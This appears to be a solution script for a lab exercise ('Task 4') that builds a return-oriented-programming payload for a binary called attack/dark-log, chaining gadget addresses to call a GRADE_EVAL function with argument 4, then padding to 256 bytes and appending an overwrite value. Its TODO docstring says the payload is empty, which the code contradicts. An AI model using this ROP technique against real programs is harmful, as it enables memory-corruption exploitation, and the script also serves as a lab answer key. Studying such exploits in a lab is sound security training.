#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

p64 = lambda x: x.to_bytes(8, "little")

POP_RDI    = 0x4018A3
RET        = 0x4018A4
GRADE_EVAL = 0x401677
MAIN_CONT  = 0x401811

rop  = p64(RET)
rop += p64(POP_RDI)
rop += p64(4)
rop += p64(GRADE_EVAL)
rop += p64(MAIN_CONT)

payload  = rop + b"\x00" * (256 - len(rop))
payload += (0xA8).to_bytes(4, "little")

sys.stdout.buffer.write(payload)
